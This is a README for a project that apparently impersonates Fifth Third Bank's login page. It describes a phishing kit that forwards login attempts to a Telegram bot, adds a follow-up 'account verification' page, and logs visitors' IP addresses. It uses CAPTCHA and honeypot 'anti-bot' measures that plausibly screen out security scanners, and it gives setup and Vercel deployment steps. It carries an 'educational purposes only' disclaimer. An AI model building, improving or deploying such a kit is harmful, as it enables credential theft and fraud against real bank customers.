# Fifth Third Bank Login Page

A modern banking login interface with strong anti-bot protection and Telegram integration.

## Features

- **Modern UI**: Fifth Third Bank-style login interface
- **Anti-Bot Protection**: Cloudflare Turnstile CAPTCHA and honeypot fields
- **Telegram Integration**: Login attempts sent to Telegram bot
- **SQLite Authentication**: User credential validation
- **Responsive Design**: Works on desktop and mobile devices

## Tech Stack

- **Frontend**: HTML5, CSS3, JavaScript (ES6+)
- **Backend**: Python Flask
- **Database**: SQLite
- **Anti-Bot**: Cloudflare Turnstile
- **Notifications**: Telegram Bot API

## Project Structure

```
├── index.html          # Main login page
├── details.html        # Account verification page
├── backend.py          # Flask backend server
├── add_user.py         # User management script
├── users.db           # SQLite database (auto-generated)
├── 53rd.logo.png      # Bank logo
├── logic.py           # Legacy logic file
├── ui.py              # Legacy UI file
└── README.md          # This file
```

## Setup Instructions

### Prerequisites
- Python 3.7+
- Flask
- Flask-CORS

### Installation
1. Clone the repository
2. Install dependencies:
   ```bash
   pip install flask flask-cors
   ```
3. Run the backend:
   ```bash
   python backend.py
   ```
4. Serve the frontend:
   ```bash
   python -m http.server 8080
   ```
5. Open http://localhost:8080/index.html

## Configuration

### Telegram Bot Setup
1. Create a Telegram bot via @BotFather
2. Get your bot token and chat ID
3. Update `backend.py` with your credentials:
   ```python
   BOT_TOKEN = "your_bot_token_here"
   CHAT_ID = "your_chat_id_here"
   ```

### Cloudflare Turnstile
The Turnstile widget is already configured with a sitekey. For production, consider getting your own sitekey from Cloudflare dashboard.

### Adding Users
Use the provided script to add users to the database:
```bash
python add_user.py
```

## Deployment

### Vercel Deployment
1. Push your code to GitHub
2. Connect your repository to Vercel
3. Deploy the frontend files (HTML/CSS/JS)
4. Deploy the backend separately (Python/Flask)

### Environment Variables
Set these in your deployment environment:
- `BOT_TOKEN`: Your Telegram bot token
- `CHAT_ID`: Your Telegram chat ID

## Security Features

- **Honeypot Fields**: Hidden fields to catch bots
- **Cloudflare Turnstile**: Modern CAPTCHA alternative
- **SQLite Authentication**: Secure user validation
- **IP Logging**: Track user IP addresses
- **Telegram Notifications**: Real-time login monitoring

## License

This project is for educational purposes only.

## Support

For issues or questions, please check the GitHub repository. 